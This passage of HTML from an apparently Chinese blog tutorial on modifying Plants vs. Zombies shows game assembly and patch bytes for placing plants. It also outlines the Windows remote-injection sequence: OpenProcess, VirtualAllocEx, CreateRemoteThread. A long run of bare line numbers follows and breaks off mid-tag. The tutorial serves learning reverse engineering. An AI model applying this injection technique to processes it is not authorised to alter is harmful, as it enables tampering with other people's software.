class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00410A91 - 8B 40 28              - mov eax,[eax+28]</span><br><span class=\"line\">00410A94 - 52                    - push edx</span><br><span class=\"line\">00410A95 - 50                    - push eax</span><br><span class=\"line\">00410A96 - 8B 44 24 20           - mov eax,[esp+20]</span><br><span class=\"line\">00410A9A - 57                    - push edi</span><br><span class=\"line\">00410A9B - 55                    - push ebp</span><br><span class=\"line\">00410A9C - E8 7FC6FFFF           - call 0040D120</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">push -1</span><br><span class=\"line\">push 3</span><br><span class=\"line\">mov eax,1</span><br><span class=\"line\">push 2</span><br><span class=\"line\">push 0EC01BD0</span><br><span class=\"line\">call 0040D120</span><br></pre></td></tr></table></figure>\n<p>3. 注入代码，将自己写的植物安放的汇编代码注入到游戏进程空间中，验证</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">push -1     ;固定的值</span><br><span class=\"line\">push 2      ;植物类型id,樱桃是2 </span><br><span class=\"line\">mov eax,4   ;x</span><br><span class=\"line\">push 4      ;y</span><br><span class=\"line\">push 147E5FF8    ;[[6A9EC0]+768]</span><br><span class=\"line\">push 0040D120</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>坐标范围为 [4][8] = 5 * 9 = 45</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">push -1     ;固定的值</span><br><span class=\"line\">push 2      ;植物类型id,樱桃是2,坚果3</span><br><span class=\"line\">mov eax,0   ;y 0-4</span><br><span class=\"line\">push 4      ;x 0-8</span><br><span class=\"line\">mov ebx,[6A9EC0]</span><br><span class=\"line\">mov ebx,[ebx+768]</span><br><span class=\"line\">push ebx</span><br><span class=\"line\">push 0040D120</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">push -1</span><br><span class=\"line\">push 2</span><br><span class=\"line\">mov eax,0</span><br><span class=\"line\">push 2</span><br><span class=\"line\">mov ebx,[6A9EC0]</span><br><span class=\"line\">mov ebx,[ebx+768]</span><br><span class=\"line\">push ebx</span><br><span class=\"line\">call 0040D120</span><br></pre></td></tr></table></figure>\n<p>5. 远程注入代码</p>\n<p>1. 打开目标进程 OpenProcess，获取目标进程句柄</p>\n<p>2. 在目标进程分配内存空间 VirtualAllocEx</p>\n<p>3. 往分配的内存空间中写入代码</p>\n<p>4. 远程调用 CreateRemoteThread  执行目标进程指定地址的代码</p>\n<p>5. 等待远程线程执行完成  WaitForSingleObject</p>\n<p>6. 释放目标进程空间   VirtualFreeEx</p>\n<p>7. 关闭目标进程句柄</p>\n<p>植物血量</p>\n<p>后台运行  有一个标识 1,0</p>\n<p>关键代码位置 0054E1C2，  0F 95 C0  -&gt; B1 01 90</p>\n<p>毁灭菇</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221210004852205.png\" alt=\"image-20221210004852205\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221210004902774.png\" alt=\"image-20221210004902774\"></p>\n<p>排错思路：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221210211445273.png\" alt=\"image-20221210211445273\"></p>\n<p>到 od 中找到对应位置，查看我们插入的额汇编是否正确</p>\n<p>冰冻</p>\n<p>土豆</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br><span class=\"line\">349</span><br><span class=\"line\">350</span><br><span class=\"line\">351</span><br><span class=\"line\">352</span><br><span class=\"line\">353</span><br><span class=\"line\">354</span><br><span class=\"line\">355</span><br><span class=\"line\">356</span><br><span class=\"line\">357</span><br><span class=\"line\">358</span><br><span class=\"line\">359</span><br><span class=\"line\">360</span><br><span class=\"line\">361</span><br><span class=\"line\">362</span><br><span class=\"line\">363</span><br><span class=\"line\">364</span><br><span class=\"line\">365</span><br><span class=\"line\">366</span><br><span class=\"line\">367</span><br><span class=\"line\">368</span><br><span class=\"line\">369</span><br><span class=\"line\">370</span><br><span class=\"line\">371</span><br><span class=\"line\">372</span><br><span class=\"line\">373</span><br><span class=\"line\">374</span><br><span class=\"line\">375</span><br><span class=\"line\">376</span><br><span class=\"line\">377</span><br><span class=\"line\">378</span><br><span class=\"line\">379</span><br><span class=\"line\">380</span><br><span class=\"line\">381</span><br><span class=\"line\">382</span><br><span class=\"line\">383</span><br><span class=\"line\">384</span><br><span class=\"line\">385</span><br><span class=\"line\">386</span><br><span class=\"line\">387</span><br><span class=\"line\">388</span><br><span class=\"line\">389</span><br><span class=\"line\">390</span><br><span class=\"line\">391</span><br><span class=\"line\">392</span><br><span class=\"line\">393</span><br><span class=\"line\">394</span><br><span class=\"line\">395</span><br><span class=\"line\">396</span><br><span class=\"line\">397</span><br><span class=\"line\">398</span><br><span class=\"line\">399</span><br><span class=\"line\">400</span><br><span class=\"line\">401</span><br><span class=\"line\">402</span><br><span class=\"line\">403</span><br><span class=\"line\">404</span><br><span class=\"line\">405</span><br><span class=\"line\">406</span><br><span class=\"line\">407</span><br><span class=\"line\">408</span><br><span class=\"line\">409</span><br><span class=\"line\">410</span><br><span class=\"line\">411</span><br><span class=\"line\">412</span><br><span class=\"line\">413</span><br><span class=\"line\">414</span><br><span class=\"line\">415</span><br><span class=\"line\">416</span><br><span class=\"line\">417</span><br><span class=\"line\">418</span><br><span class=\"line\">419</span><br><span class=\"line\">420</span><br><span class=\"line\">421</span><br><span class=\"line\">422</span><br><span class=\"line\">423</span><br><span class=\"line\">424</span><br><span class=\"line\">425</span><br><span class=\"line\">426</span><br><span class=\"line\">427</span><br><span class=\"line\">428</span><br><span class=\"line\">429</span><br><span class=\"line\">430</span><br><span class=\"line\">431</span><br><span class=\"line\">432</span><br><span class=\"line\">433</span><br><span class=\"line\">434</span><br><span class=\"line\">435</span><br><span class=\"line\">436</span><br><span class=\"line\">437</span><br><span class=\"line\">438</span><br><span class=\"line\">439</span><br><span class=\"line\">440</span><br><span class=\"line\">441</span><br><span class=\"line\">442</span><br><span class=\"line\">443</span><br><span class=\"line\">444</span><br><span class=\"line\">445</span><br><span class=\"line\">446</span><br><span class=\"line\">447</span><br><span class=\"line\">448</span><br><span class=\"line\">449</span><br><span class=\"line\">450</span><br><span class=\"line\">451</span><br><span class=\"line\">452</span><br><span class=\"line\">453</span><br><span class=\"line\">454</span><br><span class=\"line\">455</span><br><span class=\"line\">456</span><br><span class=\"line\">457</span><br><span class=\"line\">458</span><br><span class=\"line\">459</span><br><span class=\"line\">460</span><br><span class=\"line\">461</span><br><span class=\"line\">462</span><br><span class=\"line\">463</span><br><span class=\"line\">464</span><br><span class=\"line\">465</span><br><span class=\"line\">466</span><br><span class=\"line\">467</span><br><span class=\"line\">468</span><br><span class=\"line\">469</span><br><span class=\"line\">470</span><br><span class=\"line\">471</span><br><span class=\"line\">472</span><br><span class=\"line\">473</span><br><span class=\"line\">474</span><br><span class=\"line\">475</span><br><span class=\"line\">476</span><br><span class=\"line\">477</span><br><span class=\"line\">478</span><br><span class=\"line\">479</span><br><span class=\"line\">480</span><br><span class=\"line\">481</span><br><span class=\"line\">482</span><br><span class=\"line\">483</span><br><span class=\"line\">484</span><br><span class=\"line\">485</span><br><span class=\"line\">486</span><br><span class=\"line\">487</span><br><span class=\"line\">488</span><br><span class=\"line\">489</span><br><span class=\"line\">490</span><br><span class=\"line\">491</span><br><span class=\"line\">492</span><br><span class=\"line\">493</span><br><span class=\"line\">494</span><br><span class=\"line\">495</span><br><span class=\"line\">496</span><br><span class=\"line\">497</span><br><span class=\"line\">498</span><br><span class=\"line\">499</span><br><span class=\"line\">500</span><br><span class=\"line\">501</span><br><span class=\"line\">502</span><br><span class=\"line\">503</span><br><span class=\"line\">504</span><br><span class=\"line\">505</span><br><span class=\"line\">506</span><br><span class=\"line\">507</span><br><span class=\"line\">508</span><br><span class=\"line\">509</span><br><span class=\"line\">510</span><br><span class=\"line\">511</span><br><span class=\"line\">512</span><br><span class=\"line\">513</span><br><span class=\"line\">514</span><br><span class=\"line\">515</span><br><span class=\"line\">516</span><br><span class=\"line\">517</span><br><span class=\"line\">518</span><br><span class=\"line\">519</span><br><span class=\"line\">520</span><br><span class=\"line\">521</span><br><span class=\"line\">522</span><br><span class=\"line\">523</span><br><span class=\"line\">524</span><br><span class=\"line\">525</span><br><span class=\"line\">526</span><br><span class=\"line\">527</span><br><span class=\"line\">528</span><br><span class=\"line\">529</span><br><span class=\"line\">530</span><br><span class=\"line\">531</span><br><span class=\"line\">532</span><br><span class=\"line\">533</span><br><span class=\"line\">534</span><br><span class=\"line\">535</span><br><span class=\"line\">536</span><br><span class=\"line\">537</span><br><span class=\"line\">538</span><br><span class=\"line\">539</span><br><span class=\"line\">540</span><br><span class=\"line\">541</span><br><span class=\"line\">542</span><br><span class=\"line\">543</span><br><span class=\"line\">544</span><br><span class=\"line\">545</span><br><span class=\"line\">546</span><br><span class=\"line\">547</span><br><span class=\"line\">548</span><br><span class=\"line\">549</span><br><span class=\"line\">550</span><br><span class=\"line\">551</span><br><span class=\"line\">552</span><br><span class=\"line\">553</span><br><span class=\"line\">554</span><br><span class=\"line\">555</span><br><span class=\"line\">556</span><br><span class=\"line\">557</span><br><span class=\"line\">558</span><br><span class=\"line\">559</span><br><span class=\"line\">560</span><br><span class=\"line\">561</span><br><span class=\"line\">562</span><br><span class=\"line\">563</span><br><span class=\"line\">564</span><br><span class=\"line\">565</span><br><span class=\"line\">566</span><br><span class=\"line\">567</span><br><span class=\"line\">568</span><br><span class=\"line\">569</span><br><span class=\"line\">570</span><br><span class=\"line\">571</span><br><span class=\"line\">572</span><br><span class=\"line\">573</span><br><span class=\"line\">574</span><br><span class=\"line\">575</span><br><span class=\"line\">576</span><br><span class=\"line\">577</span><br><span class=\"line\">578</span><br><span class=\"line\">579</span><br><span class=\"line\">580</span><br><span class=\"line\">581</span><br><span class=\"line\">582</span><br><span class=\"line\">583</span><br><span class=\"line\">584</span><br><span class=\"line\">585</span><br><span class=\"line\">586</span><br><span class=\"line\">587</span><br><span class=\"line\">588</span><br><span class=\"line\">589</span><br><span class=\"line\">590</span><br><span class=\"line\">591</span><br><span class=\"line\">592</span><br><span class=\"line\">593</span><br><span class=\"line\">594</span><br><span class=\"line\">595</span><br><span class=\"line\">596</span><br><span class=\"line\">597</span><br><span class=\"line\">598</span><br><span class=\"line\">599</span><br><span class=\"line\">600</span><br><span class=\"line\">601</span><br><span class=\"line\">602</span><br><span class=\"line\">603</span><br><span class=\"line\">604</span><br><span class=\"line\">605</span><br><span class=\"line\">606</span><br><span class=\"line\">607</span><br><span class=\"line\">608</span><br><span class=\"line\">609</span><br><span class=\"line\">610</span><br><span class=\"line\">611</span><br><span class=\"line\">612</span><br><span class=\"line\">613</span><br><span class=\"line\">614</span><br><span class=\"line\">615</span><br><span class=\"line\">616</span><br><span class=\"line\">617</span><br><span class=\"line\">618</span><br><span class=\"line\">619</span><br><span class=\"line\">620</span><br><span class=\"line\">621</span><br><span class=\"line\">622</span><br><span class=\"line\">623</span><br><span class=\"line\">624</span><br><span class=\"line\">625</span><br><span class=\"line\">626</span><br><span class=\"line\">627</span><br><span class=\"line\">628</span><br><span class=\"line\">629</span><br><span class=\"line\">630</span><br><span class=\"line\">631</span><br><span class=\"line\">632</span><br><span class=\"line\">633</span><br><span class=\"line\">634</span><br><span class=\"line\">635</span><br><span class=\"line\">636</span><br><span class=\"line\">637</span><br><span class=\"line\">638</span><br><span class=\"line\">639</span><br><span class=\"line\">640</span><br><span class=\"line\">641</span><br><span class=\"line\">642</span><br><span class=\"line\">643</span><br><span class=\"line\">644</span><br><span class=\"line\">645</span><br><span class=\"line\">646</span><br><span class=\"line\">647</span><br><span class=\"line\">648</span><br><span class=\"line\">649</span><br><span class=\"line\">650</span><br><span class=\"line\">651</span><br><span class=\"line\">652</span><br><span class=\"line\">653</span><br><span class=\"line\">654</span><br><span class=\"line\">655</span><br><span class=\"line\">656</span><br><span class=\"line\">657</span><br><span class=\"line\">658</span><br><span class=\"line\">659</span><br><span class=\"line\">660</span><br><span class=\"line\">661</span><br><span class=\"line\">662</span><br><span class=\"line\">663</span><br><span class=\"line\">664</span><br><span class=\"line\">665</span><br><span class=\"line\">666</span><br><span class=\"line\">667</span><br><span class=\"line\">668</span><br><span class=\"line\">669</span><br><span class=\"line\">670</span><br><span class=\"line\">671</span><br><span class=\"line\">672</span><br><span class=\"line\">673</span><br><span class=\"line\">674</span><br><span class=\"line\">675</span><br><span class=\"line\">676</span><br><span class=\"line\">677</span><br><span class=\"line\">678</span><br><span class=\"line\">679</span><br><span class=\"line\">680</span><br><span class=\"line\">681</span><br><span class=\"line\">682</span><br><span class=\"line\">683</span><br><span class=\"line\">684</span><br><span class=\"line\">685</span><br><span class=\"line\">686</span><br><span class=\"line\">687</span><br><span class=\"line\">688</span><br><span class=\"line\">689</span><br><span class=\"line\">690</span><br><span class=\"line\">691</span><br><span class=\"line\">692</span><br><span class=\"line\">693</span><br><span class=\"line\">694</span><br><span class=\"line\">695</span><br><span class=\"line\">696</span><br><span class=\"line\">697</span><br><span class=\"line\">698</span><br><span class=\"line\">699</span><br><span class=\"line\">700</span><br><span class=\"line\">701</span><br><span class=\"line\">702</span><br><span class=\"line\">703</span><br><span class=\"line\">704</span><br><span class=\"line\">705</span><br><span class=\"line\">706</span><br><span class=\"line\">707</span><br><span class=\"line\">708</span><br><span class=\"line\">709</span><br><span class=\"line\">710</span><br><span class=\"line\">711</span><br><span class=\"line\">712</span><br><span class=\"line\">713</span><br><span class=\"line\">714</span><br><span class=\"line\">715</span><br><span class=\"line\">716</span><br><span class=\"line\">717</span><br><span class=\"line\">718</span><br><span class=\"line\">719</span><br><span class=\"line\">720</span><br><span class=\"line\">721</span><br><span class=\"line\">722</span><br><span class=\"line\">723</span><br><span class=\"line\">724</span><br><span class=\"line\">725</span><br><span class=\"line\">726</span><br><span class=\"line\">727</span><br><span class=\"line\">728</span><br><span class=\"line\">729</span><br><span class=\"line\">730</span><br><span class=\"line\">731</span><br><span class=\"line\">732</span><br><span class=\"line\">733</span><br><span class=\"line\">734</span><br><span class=\"line\">735</span><br><span class=\"line\">736</span><br><span class=\"line\">737</span><br><span class=\"line\">738</span><br><span class=\"line\">739</span><br><span class=\"line\">740</span><br><span class=\"line\">741</span><br><span class=\"line\">742</span><br><span class=\"line\">743</span><br><span class=\"line\">744</span><br><span class=\"line\">745</span><br><span class=\"line\">746</span><br><span class=\"line\">747</span><br><span class=\"line\">748</span><br><span class=\"line\">749</span><br><span class=\"line\">750</span><br><span class=\"line\">751</span><br><span class=\"line\">752</span><br><span class=\"line\">753</span><br><span class=\"line\">754</span><br><span class=\"line\">755</span><br><span class=\"line\">756</span><br><span class=\"line\">757</span><br><span class=\"line\">758</span><br><span class=\"line\">759</span><br><span class=\"line\">760</span><br><span class=\"line\">761</span><br><span class=\"line\">762</span><br><span class=\"line\">763</span><br><span class=\"line\">764</span><br><span class=\"line\">765</span><br><span class=\"line\">766</span><br><span class=\"line\">767</span><br><span class=\"line\">768</span><br><span class=\"line\">769</span><br><span class=\"line\">770</span><br><span class=\"line\">771</span><br><span class=\"line\">772</span><br><span class=\"line\">773</span><br><span class=\"line\">774</span><br><span class=\"line\">775</span><br><span class=\"line\">776</span><br><span class=\"line\">777</span><br><span class=\"line\">778</span><br><span class=\"line\">779</span><br><span class=\"line\">780</span><br><span class=\"line\">781</span><br><span class=\"line\">782</span><br><span class=\"line\">783</span><br><span class=\"line\">784</span><br><span class=\"line\">785</span><br><span class=\"line\">786</span><br><span class=\"line\">787</span><br><span class=\"line\">788</span><br><span class=\"line\">789</span><br><span class=\"line\">790</span><br><span class=\"line\">791</span><br><span class=\"line\">792</span><br><span class=\"line\">793</span><br><span class=\"line\">794</span><br><span class=\"line\">795</span><br><span class=\"line\">796</span><br><span class=\"line\">797</span><br><span class=\"line\">798</span><br><span class=\"line\">799</span><br><span class=\"line\">800</span><br><span class=\"line\">801</span><br><span class=\"line\">802</span><br><span class=\"line\">803</span><br><span class=\"line\">804</span><br><span class=\"line\">805</span><br><span class=\"line\">806</span><br><span class=\"line\">807</span><br><span class=\"line\">808</span><br><span class=\"line\">809</span><br><span class=\"line\">810</span><br><span class=\"line\">811</span><br><span class=\"line\">812</span><br><span class=\"line\">813</span><br><span class=\"line\">814</span><br><span class=\"line\">815</span><br><span class=\"line\">816</span><br><span class=\"line\">817</span><br><span class=\"line\">818</span><br><span class=\"line\">819</span><br><span class=\"line\">820</span><br><span class=\"line\">821</span><br><span class=\"line\">822</span><br><span class=\"line\">823</span><br><span class=\"line\">824</span><br><span class=\"line\">825</span><br><span class=\"line\">826</span><br><span class=\"line\">827</span><br><span class=\"line\">828</span><br><span class=\"line\">829</span><br><span class=\"line\">830</span><br><span class=\"line\">831</span><br><span class=\"line\">832</span><br><span class=\"line\">833</span><br><span class=\"line\">834</span><br><span class=\"line\">835</span><br><span class=\"line\">836</span><br><span class=\"line\">837</span><br><span class=\"line\">838</span><br><span class=\"line\">839</span><br><span class=\"line\">840</span><br><span class=\"line\">841</span><br><span class=\"line\">842</span><br><span class=\"line\">843</span><br><span class=\"line\">844</span><br><span class=\"line\">845</span><br><span class=\"line\">846</span><br><span class=\"line\">847</span><br><span class=\"line\">848</span><br><span class=\"line\">849</span><br><span class=\"line\">850</span><br><span class=\"line\">851</span><br><span class=\"line\">852</span><br><span class=\"line\">853</span><br><span class=\"line\">854</span><br><span class=\"line\">855</span><br><span class=\"line\">856</span><br><span class=\"line\">857</span><br><span class=\"line\">858</span><br><span class=\"line\">859</span><br><span class=\"line\">860</span><br><span class=\"line\">861</span><br><span class=\"line\">862</span><br><span class=\"line\">863</span><br><span class=\"line\">864</span><br><span class=\"line\">865</span><br><span class=\"line\">866</span><br><span class=\"line\">867</span><br><span class=\"line\">868</span><br><span class=\"line\">869</span><br><span class=\"line\">870</span><br><span class=\"line\">871</span><br><span class=\"line\">872</span><br><span class=\"line\">873</span><br><span class=\"line\">874</span><br><span class=\"line\">875</span><br><span class=\"line\">876</span><br><span class=\"line\">877</span><br><span class=\"line\">878</span><br><span class=\"line\">879</span><br><span class=\"line\">880</span><br><span class=\"line\">881</span><br><span class=\"line\">882</span><br><span class=\"line\">883</span><br><span class=\"line\">884</span><br><span class=\"line\">885</span><br><span class=\"line\">886</span><br><span class=\"line\">887</span><br><span class=\"line\">888</span><br><span class=\"line\">889</span><br><span class=\"line\">890</span><br><span class=\"line\">891</span><br><span class=\"line\">892</span><br><span class=\"line\">893</span><br><span class=\"line\">894</span><br><span class=\"line\">895</span><br><span class=\"line\">896</span><br><span class=\"line\">897</span><br><span 